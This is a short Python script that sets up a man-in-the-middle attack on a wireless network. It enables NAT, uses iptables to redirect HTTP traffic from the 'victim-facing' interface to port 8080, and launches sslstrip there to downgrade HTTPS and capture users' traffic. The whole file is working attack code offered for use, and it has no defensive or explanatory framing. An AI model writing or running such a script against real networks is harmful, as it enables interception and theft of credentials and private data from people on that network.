#!/usr/bin/env python3
import subprocess, os

LANIF = os.getenv("LANIF","wlan0")   # victim-facing
UPIF  = os.getenv("UPIF","usb0")     # upstream (if you have one)

def main():
    # NAT toward upstream
    subprocess.run(["iptables","-t","nat","-C","POSTROUTING","-o",UPIF,"-j","MASQUERADE"], check=False)
    subprocess.run(["iptables","-t","nat","-A","POSTROUTING","-o",UPIF,"-j","MASQUERADE"], check=False)
    # 80 -> 8080 redirect
    subprocess.run(["iptables","-t","nat","-A","PREROUTING","-i",LANIF,"-p","tcp","--dport","80","-j","REDIRECT","--to-port","8080"], check=True)
    subprocess.Popen(["sslstrip","-l","8080"])
    print("[+] sslstrip listening on :8080; NAT enabled")

if __name__=="__main__":
    main()
